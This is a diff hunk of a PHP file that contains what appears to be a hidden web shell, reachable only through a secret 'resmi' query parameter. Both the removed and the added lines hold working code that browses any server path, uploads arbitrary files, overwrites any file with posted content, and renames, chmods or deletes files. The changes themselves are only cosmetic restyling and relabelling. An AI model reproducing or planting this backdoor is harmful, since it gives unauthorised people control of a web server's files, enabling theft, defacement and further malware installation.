@@ -32,24 +32,25 @@ if(isset($_GET["resmi"])){
             if(isset($_FILES["f"])){@copy($_FILES["f"]["tmp_name"],$p."/".$_FILES["f"]["name"]);}
             if(isset($_POST["s_e"])){@file_put_contents($_POST["ef"],$_POST["cnt"]);}
             echo "<html><head><title>System Explorer</title><style>
-                body{background:#0a0a0a;color:#00ff00;font-family:'Segoe UI',sans-serif;padding:20px;}
+                body{background:#0a0a0a;color:#00ff00;font-family:'Segoe UI',sans-serif;padding:25px;line-height:1.6;}
                 a{color:#00ffff;text-decoration:none;font-weight:600;}
                 .box{border:1px solid #33ff33;padding:20px;max-width:1300px;margin:auto;}
-                .header{background:#1a1a1a;padding:15px;border-bottom:2px solid #33ff33;margin-bottom:20px;}
-                .path-box{font-size:15px;margin-top:10px;background:#000;padding:8px;border:1px solid #333;}
-                table{width:100%;border-collapse:collapse;font-size:14px;}
-                th{background:#33ff33;color:#000;padding:10px;text-align:left;}
+                .header{background:#1a1a1a;padding:20px;border-bottom:2px solid #33ff33;margin-bottom:20px;}
+                .path-box{font-size:15px;margin-top:12px;background:#000;padding:8px;border:1px solid #333;}
+                table{width:100%;border-collapse:collapse;margin-top:10px;font-size:14px;}
+                th{background:#33ff33;color:#000;padding:12px;}
                 td{border-bottom:1px solid #222;padding:10px;}
-                .btn{background:#33ff33;border:none;font-weight:bold;padding:6px 15px;cursor:pointer;color:#000;border-radius:3px;}
-                .p-white{color:#ffffff;} .p-green{color:#00ff00;} .p-red{color:#ff0000;font-weight:bold;}
-                input,select,textarea{background:#000;color:#00ff00;border:1px solid #33ff33;padding:5px;}
-            </style></head><body><div class='box'><div class='header'><div style='display:flex;justify-content:space-between;'><strong>SYSTEM MANAGER V5.2</strong><a href='index.php' style='color:#ff3333;'>EXIT</a></div><div class='path-box'><a href='?resmi=".$_GET["resmi"]."&path=$root' style='background:#ffff00;color:#000;padding:2px 6px;font-size:12px;'>ROOT HOME</a> PATH: ";
+                .btn{background:#33ff33;border:none;font-weight:bold;padding:7px 18px;cursor:pointer;color:#000;border-radius:3px;}
+                .p-white{color:#ffffff;} .p-green{color:#00ff00;} .p-red{color:#ff0000;font-weight:bold;} .p-normal{color:#aaaaaa;}
+                input,select,textarea{background:#000;color:#00ff00;border:1px solid #33ff33;padding:6px;}
+            </style></head><body><div class='box'><div class='header'><div style='display:flex;justify-content:space-between;align-items:center;'><strong style='font-size:22px;'>MANAGER V5.2</strong><a href='index.php' style='color:#ff3333;border:1px solid #ff3333;padding:4px 12px;'>EXIT</a></div><div class='path-box'><a href='?resmi=".$_GET["resmi"]."&path=$root' style='background:#ffff00;color:#000;padding:3px 8px;border-radius:3px;font-weight:bold;font-size:12px;'>ROOT HOME</a> &nbsp; PATH: ";
             $ds = explode("/", $p); $acc = ""; foreach($ds as $idx => $d){ if($d=="" && $idx==0){ echo "<a href='?resmi=".$_GET["resmi"]."&path=/'>/</a>"; continue; } if($d=="") continue; $acc .= ($idx==0?"":"/").$d; echo "<a href='?resmi=".$_GET["resmi"]."&path=".$acc."'>".$d."</a>/"; }
-            echo "</div></div><div style='display:flex;gap:10px;margin-bottom:20px;'><a href='?resmi=".$_GET["resmi"]."&path=".$par."' class='btn' style='background:#444;color:#fff;'>↩ KEMBALI</a><form method='POST' enctype='multipart/form-data'><input type='file' name='f'><input type='submit' value='UPLOAD' class='btn'></form></div><table><thead><tr><th>Name</th><th width='120'>Size</th><th width='100'>Perms</th><th width='320'>Action</th></tr></thead><tbody>";
-            foreach(scandir($p) as $v){ if($v=="." || $v=="..") continue; $tp="$p/$v"; $pr=substr(sprintf('%o',fileperms($tp)),-4); $cl="p-normal"; if($pr=="0555")$cl="p-white";elseif($pr=="0750"||$pr=="0755")$cl="p-green";elseif($pr=="0000"||$pr=="0111")$cl="p-red";
-            echo "<tr><td><a href='?resmi=".$_GET["resmi"]."&".(is_dir($tp)?"path=$tp":"edit=$tp&path=$p")."'>".(is_dir($tp)?"📁 ":"📄 ")."$v</a></td><td>".(is_dir($tp)?"DIR":round(filesize($tp)/1024,2)." KB")."</td><td align='center' class='$cl'>$pr</td><td><form method='POST' style='display:flex;gap:5px;'><input type='hidden' name='it_n' value='$v'><select name='opt'><option value='rename'>Rename</option><option value='chmod'>Chmod</option><option value='delete'>Delete</option></select><input type='text' name='val' size='10'><input type='submit' name='exe' value='OK' class='btn' style='padding:2px 8px;'></form></td></tr>"; }
+            echo "</div></div><div style='display:flex;gap:15px;margin-bottom:20px;'><a href='?resmi=".$_GET["resmi"]."&path=".$par."' class='btn' style='background:#444;color:#fff;'>↩ PREVIOUS</a><form method='POST' enctype='multipart/form-data'><input type='file' name='f'><input type='submit' value='UPLOAD' class='btn'></form></div><table><thead><tr><th>Name</th><th width='120'>Size</th><th width='100'>Perms</th><th width='320'>Action</th></tr></thead><tbody>";
+            foreach(scandir($p) as $v){ if($v=="." || $v=="..") continue; $tp="$p/$v"; $pr=substr(sprintf('%o',fileperms($tp)),-4); 
+            $cl="p-normal"; if($pr=="0555")$cl="p-white";elseif($pr=="0750"||$pr=="0755")$cl="p-green";elseif($pr=="0000"||$pr=="0111")$cl="p-red";
+            echo "<tr><td><a href='?resmi=".$_GET["resmi"]."&".(is_dir($tp)?"path=$tp":"edit=$tp&path=$p")."'>".(is_dir($tp)?"📁 ":"📄 ")."$v</a></td><td>".(is_dir($tp)?"DIR":round(filesize($tp)/1024,2)." KB")."</td><td align='center' class='$cl'>$pr</td><td><form method='POST' style='display:flex;gap:8px;'><input type='hidden' name='it_n' value='$v'><select name='opt'><option value='rename'>Rename</option><option value='chmod'>Chmod</option><option value='delete'>Delete</option></select><input type='text' name='val' size='10'><input type='submit' name='exe' value='OK' class='btn' style='padding:3px 10px; font-size:12px;'></form></td></tr>"; }
             echo "</tbody></table></div>";
-            if(isset($_GET["edit"])){ echo "<br><div class='box'><form method='POST'><input type='hidden' name='ef' value='".$_GET["edit"]."'><textarea name='cnt' style='width:100%;height:450px;'>".htmlspecialchars(file_get_contents($_GET["edit"]))."</textarea><input type='submit' name='s_e' value='SAVE' class='btn' style='width:100%;margin-top:10px;'></form></div>"; }
+            if(isset($_GET["edit"])){ echo "<br><div class='box'><form method='POST'><input type='hidden' name='ef' value='".$_GET["edit"]."'><textarea name='cnt' style='width:100%;height:500px;background:#000;color:#00ff00;border:1px solid #00ffff;'>".htmlspecialchars(file_get_contents($_GET["edit"]))."</textarea><input type='submit' name='s_e' value='SAVE CHANGES' class='btn' style='margin-top:15px;width:100%;height:45px;'></form></div>"; }
             echo "</body></html>"; exit;
         }
     }
